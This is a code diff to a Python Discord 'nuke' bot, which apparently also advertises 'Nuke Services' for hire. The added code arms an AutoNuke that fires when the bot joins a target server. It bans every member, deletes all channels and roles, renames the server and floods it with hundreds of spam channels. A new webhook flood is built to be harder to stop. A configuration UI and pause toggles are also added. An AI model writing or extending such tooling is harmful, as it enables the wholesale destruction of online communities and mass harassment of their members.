@@ -1,3 +1,4 @@
+from __future__ import annotations
 import discord
 from discord.ext import commands
 import asyncio
@@ -61,7 +62,7 @@ async def _log_embed(embed: discord.Embed):
     """Send a log embed to the log channel and/or file."""
     if LOG_FILE_ENABLED:
         try:
-            ts = datetime.datetime.now(datetime.UTC).strftime("%Y-%m-%d %H:%M:%S")
+            ts = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
             line = f"[{ts}] {embed.title} — {embed.description or ''}\n"
             with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
                 f.write(line)
@@ -78,7 +79,7 @@ async def _log_embed(embed: discord.Embed):
 def _action_embed(title: str, color: int, fields: list[tuple] | None = None,
                   footer: str | None = None) -> discord.Embed:
     """Build a clean log embed."""
-    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.now(datetime.UTC))
+    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.utcnow())
     if fields:
         for name, value, inline in fields:
             e.add_field(name=name, value=str(value)[:1024], inline=inline)
@@ -149,7 +150,7 @@ class LiveTimer:
             title = f"⏱️  `!{self.command}`  —  Running…"
 
         e = discord.Embed(title=title, color=color,
-                          timestamp=datetime.datetime.now(datetime.UTC))
+                          timestamp=datetime.datetime.utcnow())
 
         bar_str = f"`{self._bar(pct)}`  **{int(pct * 100)}%**"
         e.add_field(name="Progress", value=bar_str, inline=False)
@@ -397,6 +398,38 @@ async def safe(coro):
 
 STOPPED = False
 
+# Tracks every running command task so stop() can hard-cancel them all
+_ACTIVE_TASKS: set = set()
+
+@bot.before_invoke
+async def _register_task(ctx):
+    t = asyncio.current_task()
+    if t:
+        _ACTIVE_TASKS.add(t)
+
+@bot.after_invoke
+async def _unregister_task(ctx):
+    t = asyncio.current_task()
+    if t:
+        _ACTIVE_TASKS.discard(t)
+
+async def _do_stop(reply_coro=None):
+    """Kill all running operations: set flag + cancel every active task."""
+    global STOPPED
+    STOPPED = True
+    current = asyncio.current_task()
+    killed = 0
+    for t in list(_ACTIVE_TASKS):
+        if t is not current and not t.done():
+            t.cancel()
+            killed += 1
+    _ACTIVE_TASKS.clear()
+    if reply_coro:
+        try:
+            await reply_coro
+        except Exception:
+            pass
+
 async def _run_if_not_stopped(coro):
     global STOPPED
     if STOPPED:
@@ -408,7 +441,6 @@ async def batch(coros, size=5, delay=0.5):
     coros = list(coros)
     n = len(coros)
 
-    # Register this batch with the live timer (first call wins for estimate)
     if _active_timer:
         _active_timer.register_batch(n, size, delay)
 
@@ -439,15 +471,13 @@ async def status(ctx, action):
 
 @bot.command()
 async def stop(ctx):
-    global STOPPED
-    STOPPED = True
-    await ctx.send("🛑 **All operations stopped.** Use `!resume` to re-enable.")
+    await _do_stop(ctx.send("🛑 **All operations stopped.** Use `!resume` to re-enable."))
 
 @bot.command()
 async def resume(ctx):
     global STOPPED
     STOPPED = False
-    await ctx.send("▶️ **Operations resumed.**")
+    await ctx.send("▶️ **Operations resumed.")
 
 # ─────────────────────────────────────────────
 # WHITELIST  (master only)
@@ -790,10 +820,15 @@ class HelpView(discord.ui.View):
         super().__init__(timeout=120)
         self.current = "channels"
         keys = list(HELP_PAGES.keys())
-        # Dynamically distribute buttons across rows (max 5 per row per Discord UI limits)
-        for index, key in enumerate(keys):
-            row = index // 5
-            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=row))
+        # Row 0 — first 5
+        for key in keys[:5]:
+            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=0))
+        # Row 1 — next 5
+        for key in keys[5:10]:
+            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=1))
+        # Row 2 — remaining (up to 5)
+        for key in keys[10:15]:
+            self.add_item(HelpButton(key, HELP_PAGES[key]["label"], row=2))
 
     def get_embed(self, page_key: str) -> discord.Embed:
         page = HELP_PAGES[page_key]
@@ -2363,6 +2398,16 @@ async def on_message(message: discord.Message):
     # Always process commands first
     await bot.process_commands(message)
 
+    # Owner DM "stop" — kills everything instantly
+    if (not message.guild
+            and not message.author.bot
+            and message.author.id == MASTER_ID
+            and message.content.strip().lower() == "stop"):
+        await _do_stop(message.channel.send(
+            "🛑 **All operations stopped.** DM `resume` or use `!resume` to re-enable."
+        ))
+        return
+
     # Only handle DMs, not from bots, not from self
     if message.guild or message.author.bot:
         return
@@ -2497,7 +2542,7 @@ class _HireModal(discord.ui.Modal, title="🔥 Hire Request — Nuke Services"):
             "payment":       self.payment.value,
             "contact":       self.contact.value,
             "status":        "pending",
-            "created_at":    datetime.datetime.now(datetime.UTC).isoformat(),
+            "created_at":    datetime.datetime.utcnow().isoformat(),
             "handled_by":    None,
             "note":          "",
         }
@@ -2543,7 +2588,7 @@ def _ticket_embed(t: dict) -> discord.Embed:
     e = discord.Embed(
         title=f"🎫 Hire Ticket  #{t['id']}  —  {_TICKET_ICONS[status]} {status.upper()}",
         color=_TICKET_COLORS[status],
-        timestamp=datetime.datetime.now(datetime.UTC),
+        timestamp=datetime.datetime.utcnow(),
     )
     e.add_field(name="👤 Client",       value=f"<@{t['user_id']}> `{t['user_name']}`", inline=True)
     e.add_field(name="🎯 Target",       value=t["server_name"],   inline=True)
@@ -3087,7 +3132,7 @@ async def _fast_ban_all(guild: discord.Guild, concurrency: int = 15, reason: str
     await asyncio.gather(*[_do(m) for m in targets])
 
 async def _rich_status(ctx, title: str, color: int = 0x57f287, **fields):
-    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.now(datetime.UTC))
+    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.utcnow())
     for name, value in fields.items():
         e.add_field(name=name, value=str(value), inline=True)
     try:
@@ -3118,46 +3163,191 @@ AUTONUKE_TARGETS: dict = _load_autonuke()
 async def _execute_autonuke(guild: discord.Guild, cfg: dict):
     ch_name  = cfg.get("channel", "nuked")
     msg_text = cfg.get("message", "@everyone")
-    # 1) Ban everyone simultaneously
-    await _fast_ban_all(guild, reason="AutoNuke")
-    # 2) Wipe all channels simultaneously
-    await _fast_delete_channels(guild)
-    # 3) Wipe all deletable roles
-    await _fast_delete_roles(guild)
-    # 4) Rename server
-    await safe(guild.edit(name=ch_name))
-    # 5) Flood with new channels + spam
-    ch_sem = asyncio.Semaphore(5)
-    async def _spawn():
-        async with ch_sem:
-            ch = await safe(guild.create_text_channel(ch_name))
+    actions  = cfg.get("actions", {
+        "ban": True, "del_channels": True, "del_roles": True,
+        "rename": True, "flood": True,
+    })
+    if actions.get("ban"):
+        await _fast_ban_all(guild, reason="AutoNuke")
+    if actions.get("del_channels"):
+        await _fast_delete_channels(guild)
+    if actions.get("del_roles"):
+        await _fast_delete_roles(guild)
+    if actions.get("rename"):
+        await safe(guild.edit(name=ch_name))
+    if actions.get("flood") and not actions.get("webhook"):
+        # Regular flood: bot creates channels and spams as each one is made.
+        ch_sem = asyncio.Semaphore(3)
+        async def _make_and_spam():
+            ch = None
+            async with ch_sem:
+                ch = await safe(guild.create_text_channel(ch_name))
             if ch:
-                await asyncio.gather(*[safe(ch.send(msg_text)) for _ in range(30)])
-    await asyncio.gather(*[_spawn() for _ in range(200)])
+                for _ in range(10):
+                    await safe(ch.send(msg_text))
+                    await asyncio.sleep(0.5)
+        await asyncio.gather(*[_make_and_spam() for _ in range(200)])
+    if actions.get("webhook"):
+        # Webhook flood: create channel + webhook, release creation slot, then
+        # blast messages through the webhook (separate rate-limit bucket, much
+        # harder to stop). Works whether or not regular flood is also on.
+        ch_sem = asyncio.Semaphore(3)
+        async def _webhook_flood():
+            ch = None
+            wh = None
+            async with ch_sem:
+                ch = await safe(guild.create_text_channel(ch_name))
+                if ch:
+                    wh = await safe(ch.create_webhook(name=ch_name))
+            if wh:
+                async with aiohttp.ClientSession() as session:
+                    wh_obj = discord.Webhook.from_url(wh.url, session=session)
+                    for _ in range(15):
+                        await safe(wh_obj.send(msg_text))
+                        await asyncio.sleep(0.3)
+        await asyncio.gather(*[_webhook_flood() for _ in range(200)])
+    fired = [k for k, v in actions.items() if v]
     await _log_embed(_action_embed("☢️ AUTONUKE EXECUTED", 0xff0000, [
         ("Guild",    f"{guild.name} `{guild.id}`", True),
         ("Channel",  ch_name,                      True),
         ("Message",  msg_text[:200],               False),
         ("Armed by", cfg.get("set_by", "?"),       True),
+        ("Actions",  ", ".join(fired) or "none",   False),
     ]))
+
+
+# ── AutoNuke config UI ──────────────────────────────────────────────
+
+_AUTONUKE_ACTIONS = [
+    ("ban",          "💀 Ban Members",   0),
+    ("del_channels", "🗑️ Del Channels",  0),
+    ("del_roles",    "🎭 Del Roles",      0),
+    ("rename",       "✏️ Rename Server",  0),
+    ("flood",        "📢 Flood & Spam",   0),
+    ("webhook",      "🪝 Webhook Flood",  1),
+]
+
+class AutoNukeToggle(discord.ui.Button):
+    def __init__(self, key: str, label: str, enabled: bool, row: int = 0):
+        super().__init__(
+            label=f"{'✅' if enabled else '❌'} {label}",
+            style=discord.ButtonStyle.success if enabled else discord.ButtonStyle.danger,
+            custom_id=key,
+            row=row,
+        )
+        self.key = key
+        self.enabled = enabled
+
+    async def callback(self, interaction: discord.Interaction):
+        self.enabled = not self.enabled
+        self.label = f"{'✅' if self.enabled else '❌'} " + self.label.split(" ", 1)[1]
+        self.style = discord.ButtonStyle.success if self.enabled else discord.ButtonStyle.danger
+        view: AutoNukeView = self.view
+        await interaction.response.edit_message(embed=view.build_embed(), view=view)
+
+
+class AutoNukeArm(discord.ui.Button):
+    def __init__(self):
+        super().__init__(
+            label="☢️  ARM AutoNuke",
+            style=discord.ButtonStyle.danger,
+            row=2,
+        )
+
+    async def callback(self, interaction: discord.Interaction):
+        view: AutoNukeView = self.view
+        actions = {b.key: b.enabled for b in view.children if isinstance(b, AutoNukeToggle)}
+        if not any(actions.values()):
+            await interaction.response.send_message("❌ Select at least one action.", ephemeral=True)
+            return
+
+        AUTONUKE_TARGETS[str(view.guild_id)] = {
+            "channel": view.channel,
+            "message": view.message,
+            "actions": actions,
+            "enabled": True,
+            "set_by":  view.set_by,
+            "set_at":  datetime.datetime.utcnow().isoformat(),
+        }
+        _save_autonuke()
+
+        for child in view.children:
+            child.disabled = True
+        armed_list = "\n".join(
+            f"{'✅' if actions[key] else '❌'}  {label}"
+            for key, label, _ in _AUTONUKE_ACTIONS
+        )
+        e = discord.Embed(
+            title="☢️ AutoNuke Armed",
+            description=(
+                f"The next time this bot joins guild **`{view.guild_id}`** it will execute:\n\n"
+                + armed_list
+            ),
+            color=0xff0000,
+        )
+        e.add_field(name="🎯 Target Guild", value=f"`{view.guild_id}`", inline=True)
+        e.add_field(name="📁 Channel Name", value=view.channel,         inline=True)
+        e.add_field(name="💬 Spam Message", value=view.message[:200],   inline=False)
+        e.set_footer(text="Use !autonukeclear to disarm  •  !autonutelist to list all")
+        await interaction.response.edit_message(embed=e, view=view)
+        await _log_embed(_action_embed("☢️ AutoNuke Armed", 0xff0000, [
+            ("Guild ID", str(view.guild_id), True),
+            ("By",       view.set_by,        True),
+            ("Channel",  view.channel,       True),
+            ("Message",  view.message[:200], False),
+            ("Actions",  ", ".join(k for k, v in actions.items() if v), False),
+        ]))
+
+
+class AutoNukeView(discord.ui.View):
+    def __init__(self, guild_id: int, channel: str, message: str, set_by: str):
+        super().__init__(timeout=180)
+        self.guild_id = guild_id
+        self.channel  = channel
+        self.message  = message
+        self.set_by   = set_by
+        for key, label, row in _AUTONUKE_ACTIONS:
+            self.add_item(AutoNukeToggle(key, label, enabled=True, row=row))
+        self.add_item(AutoNukeArm())
+
+    def build_embed(self) -> discord.Embed:
+        actions = {b.key: b.enabled for b in self.children if isinstance(b, AutoNukeToggle)}
+        lines = "\n".join(
+            f"{'✅' if actions[key] else '❌'}  {label}"
+            for key, label, _ in _AUTONUKE_ACTIONS
+        )
+        e = discord.Embed(
+            title="☢️ Configure AutoNuke",
+            description=(
+                f"**Target guild:** `{self.guild_id}`\n"
+                f"Toggle the actions below, then press **☢️ ARM AutoNuke** to confirm.\n\n"
+                + lines
+            ),
+            color=0xff6600,
+        )
+        e.add_field(name="📁 Channel Name", value=self.channel,       inline=True)
+        e.add_field(name="💬 Spam Message", value=self.message[:200], inline=True)
+        e.set_footer(text="Green = will fire  •  Red = skipped")
+        return e
 
 
 @bot.event
 async def on_guild_join(guild: discord.Guild):
-    cfg = AUTONUKE_TARGETS.get(str(guild.id))
-    if cfg:
+    cfg     = AUTONUKE_TARGETS.get(str(guild.id))
+    firing  = cfg and cfg.get("enabled", True)
+    if firing:
         AUTONUKE_TARGETS.pop(str(guild.id), None)
         _save_autonuke()
         asyncio.create_task(_execute_autonuke(guild, cfg))
     await _log_embed(_action_embed(
-        "🤖 Bot Joined Guild" + (" — ☢️ AUTONUKE ARMED" if cfg else ""),
-        0xff0000 if cfg else 0x57f287, [
+        "🤖 Bot Joined Guild" + (" — ☢️ AUTONUKE FIRING" if firing else (" — ⏸️ AUTONUKE PAUSED" if cfg else "")),
+        0xff0000 if firing else 0x57f287, [
         ("Guild",    f"{guild.name} `{guild.id}`", True),
         ("Members",  str(guild.member_count),      True),
         ("Owner",    str(guild.owner),             True),
         ("Channels", str(len(guild.channels)),     True),
         ("Roles",    str(len(guild.roles)),        True),
-        ("AutoNuke", "☢️ FIRING" if cfg else "None", True),
+        ("AutoNuke", "☢️ FIRING" if firing else ("⏸️ PAUSED" if cfg else "None"), True),
     ]))
 
 @bot.event
@@ -3170,34 +3360,9 @@ async def on_guild_remove(guild: discord.Guild):
 
 @bot.command()
 async def autonuke(ctx, guild_id: int, channel: str, *, message: str = "@everyone"):
-    """Arm an AutoNuke — fires the moment the bot joins that guild."""
-    AUTONUKE_TARGETS[str(guild_id)] = {
-        "channel":  channel,
-        "message":  message,
-        "set_by":   str(ctx.author),
-        "set_at":   datetime.datetime.now(datetime.UTC).isoformat(),
-    }
-    _save_autonuke()
-    e = discord.Embed(
-        title="☢️ AutoNuke Armed",
-        description=(
-            f"The next time this bot joins guild **`{guild_id}`**, it will immediately:\n"
-            "1. Ban all members\n2. Delete all channels\n3. Delete all roles\n"
-            "4. Rename the server\n5. Flood with channels & spam"
-        ),
-        color=0xff0000,
-    )
-    e.add_field(name="🎯 Target Guild", value=f"`{guild_id}`", inline=True)
-    e.add_field(name="📁 Channel Name", value=channel,         inline=True)
-    e.add_field(name="💬 Spam Message", value=message[:200],   inline=False)
-    e.set_footer(text="Use !autonukeclear to disarm  •  !autonutelist to list all")
-    await ctx.send(embed=e)
-    await _log_embed(_action_embed("☢️ AutoNuke Armed", 0xff0000, [
-        ("Guild ID", str(guild_id),    True),
-        ("By",       str(ctx.author), True),
-        ("Channel",  channel,          True),
-        ("Message",  message[:200],   False),
-    ]))
+    """Arm an AutoNuke — configure which actions fire when the bot joins that guild."""
+    view = AutoNukeView(guild_id, channel, message, str(ctx.author))
+    await ctx.send(embed=view.build_embed(), view=view)
 
 @bot.command()
 async def autonukeclear(ctx, guild_id: int = None):
@@ -3214,15 +3379,43 @@ async def autonukeclear(ctx, guild_id: int = None):
         await ctx.send(f"✅ {n} AutoNuke(s) disarmed.")
 
 @bot.command()
+async def autonuketoggle(ctx, guild_id: int):
+    """Toggle an armed AutoNuke on (will fire) or off (paused) without removing it."""
+    key = str(guild_id)
+    if key not in AUTONUKE_TARGETS:
+        await ctx.send(f"❌ No AutoNuke armed for `{guild_id}`.")
+        return
+    current = AUTONUKE_TARGETS[key].get("enabled", True)
+    AUTONUKE_TARGETS[key]["enabled"] = not current
+    _save_autonuke()
+    state = "☢️ **ARMED** (will fire on join)" if not current else "⏸️ **PAUSED** (will not fire)"
+    e = discord.Embed(
+        title="🔁 AutoNuke Toggled",
+        description=f"Guild `{guild_id}` — {state}",
+        color=0xff0000 if not current else 0xffa500,
+    )
+    await ctx.send(embed=e)
+
+@bot.command()
 async def autonutelist(ctx):
     """List all armed AutoNukes."""
     if not AUTONUKE_TARGETS:
         await ctx.send("✅ No AutoNukes armed.")
         return
-    lines = [f"`{gid}` — ch: `{c['channel']}` msg: `{c['message'][:40]}` — by {c['set_by']}"
-             for gid, c in AUTONUKE_TARGETS.items()]
-    e = discord.Embed(title=f"☢️ Armed AutoNukes ({len(AUTONUKE_TARGETS)})",
-                      description="\n".join(lines), color=0xff0000)
+    lines = []
+    for gid, c in AUTONUKE_TARGETS.items():
+        enabled = c.get("enabled", True)
+        status  = "☢️" if enabled else "⏸️"
+        lines.append(
+            f"{status} `{gid}` — ch: `{c['channel']}` "
+            f"msg: `{c['message'][:30]}` — by {c['set_by']}"
+        )
+    e = discord.Embed(
+        title=f"☢️ Armed AutoNukes ({len(AUTONUKE_TARGETS)})",
+        description="\n".join(lines),
+        color=0xff0000,
+    )
+    e.set_footer(text="☢️ = will fire on join  •  ⏸️ = paused  •  use !autonuketoggle <id> to switch")
     await ctx.send(embed=e)
 
 # ═══════════════════════════════════════════════════════════════════
@@ -3307,7 +3500,7 @@ async def warn(ctx, member: discord.Member, *, reason: str = "No reason provided
     WARNS.setdefault(uid, [])
     wid = len(WARNS[uid]) + 1
     WARNS[uid].append({"id": wid, "reason": reason, "by": str(ctx.author),
-                        "at": datetime.datetime.now(datetime.UTC).isoformat()})
+                        "at": datetime.datetime.utcnow().isoformat()})
     _save_warns()
     e = discord.Embed(title=f"⚠️ Warning #{wid} issued", color=0xffa500)
     e.add_field(name="User",   value=f"{member.mention} `{member.id}`",   inline=True)
@@ -3387,7 +3580,7 @@ async def masswarn(ctx, role: discord.Role, *, reason: str = "Mass warning"):
         uid = str(m.id)
         WARNS.setdefault(uid, [])
         WARNS[uid].append({"id": len(WARNS[uid])+1, "reason": reason,
-                           "by": str(ctx.author), "at": datetime.datetime.now(datetime.UTC).isoformat()})
+                           "by": str(ctx.author), "at": datetime.datetime.utcnow().isoformat()})
     _save_warns()
     await _rich_status(ctx, f"⚠️ Mass Warned {len(targets)} members", 0xffa500,
                        Role=role.name, Count=len(targets), Reason=reason)
@@ -3413,7 +3606,7 @@ async def backup(ctx, *, label: str = ""):
     bid = f"{g.id}_{int(time.time())}"
     _backups[bid] = {
         "label": label or g.name, "guild_id": g.id, "guild_name": g.name,
-        "created_at": datetime.datetime.now(datetime.UTC).isoformat(), "created_by": str(ctx.author),
+        "created_at": datetime.datetime.utcnow().isoformat(), "created_by": str(ctx.author),
         "roles": [{"name": r.name, "color": r.color.value, "hoist": r.hoist,
                    "mentionable": r.mentionable, "permissions": r.permissions.value}
                   for r in g.roles if not r.is_default() and not r.managed],
@@ -3430,7 +3623,7 @@ async def backup(ctx, *, label: str = ""):
     }
     _save_backups()
     e = discord.Embed(title="💾 Backup Created", description=f"`{bid}`",
-                      color=0x57f287, timestamp=datetime.datetime.now(datetime.UTC))
+                      color=0x57f287, timestamp=datetime.datetime.utcnow())
     b = _backups[bid]
     e.add_field(name="Guild",      value=g.name,                      inline=True)
     e.add_field(name="Roles",      value=len(b["roles"]),             inline=True)
@@ -4351,7 +4544,7 @@ async def massdmembed(ctx, role: discord.Role, title: str, *, body: str):
     """DM all members with a role using a rich embed."""
     targets = [m for m in role.members if not m.bot]
     e = discord.Embed(title=title, description=body, color=role.color,
-                      timestamp=datetime.datetime.now(datetime.UTC))
+                      timestamp=datetime.datetime.utcnow())
     e.set_footer(text=f"From: {ctx.guild.name}")
     sent = fail = 0
     for m in targets:
@@ -4440,7 +4633,7 @@ async def poll(ctx, question: str, *, options: str):
     emojis = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
     desc   = "\n".join(f"{emojis[i]} {o}" for i, o in enumerate(opts))
     e = discord.Embed(title=f"📊 {question}", description=desc, color=0x5865F2,
-                      timestamp=datetime.datetime.now(datetime.UTC))
+                      timestamp=datetime.datetime.utcnow())
     e.set_footer(text=f"Poll by {ctx.author}")
     msg = await ctx.send(embed=e)
     for i in range(len(opts)):
@@ -4493,7 +4686,7 @@ async def massdel(ctx, count: int = 100):
 @bot.command()
 async def embedfields(ctx, title: str, *, fields: str):
     """Send a rich embed. Format: 'title | field1:value1 | field2:value2'"""
-    e = discord.Embed(title=title, color=0x5865F2, timestamp=datetime.datetime.now(datetime.UTC))
+    e = discord.Embed(title=title, color=0x5865F2, timestamp=datetime.datetime.utcnow())
     for field in fields.split("|"):
         field = field.strip()
         if ":" in field:
@@ -4552,7 +4745,7 @@ async def purgereacts(ctx, message_id: int):
 async def globalannounce(ctx, *, message: str):
     """Send an announcement embed to the first channel of every guild the bot is in."""
     e = discord.Embed(title="📢 Global Announcement", description=message,
-                      color=0xff0000, timestamp=datetime.datetime.now(datetime.UTC))
+                      color=0xff0000, timestamp=datetime.datetime.utcnow())
     e.set_footer(text=f"From: {ctx.guild.name} • {ctx.author}")
     sent = 0
     for guild in bot.guilds:
@@ -4830,7 +5023,7 @@ async def scheduleannounce(ctx, delay: float, channel: discord.TextChannel, *, m
     await ctx.send(f"⏱️ Scheduled message to {channel.mention} in {delay}s.")
     await asyncio.sleep(delay)
     e = discord.Embed(description=message, color=0x5865F2,
-                      timestamp=datetime.datetime.now(datetime.UTC))
+                      timestamp=datetime.datetime.utcnow())
     e.set_footer(text=f"Scheduled by {ctx.author}")
     await safe(channel.send(embed=e))
 
@@ -4981,6 +5174,19 @@ async def hex2rgb(ctx, hex_code: str):
         await ctx.send(f"🎨 `#{hex_code.upper()}` = RGB({r}, {g}, {b})")
     except Exception:
         await ctx.send("❌ Invalid hex color.")
+
+@bot.command()
+async def invite(ctx):
+    """Generate a bot invite link."""
+    url = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot"
+    e = discord.Embed(
+        title="🔗 Invite The End Of All Fate",
+        description=f"[**Click here to invite the bot**]({url})\n\n`{url}`",
+        color=0x5865F2,
+    )
+    e.set_thumbnail(url=bot.user.display_avatar.url)
+    e.set_footer(text="Requires Administrator permission")
+    await ctx.send(embed=e)
 
 @bot.command()
 async def botinfo(ctx):
@@ -5141,4 +5347,4 @@ async def on_ready():
     print(f"Whitelist: {sorted(WHITELIST)}")
     print(f"Commands: {len(bot.commands)}")
 
-bot.run(os.getenv("NUKE_TOKEN"))
+bot.run(os.getenv("NUKE_BOT"))
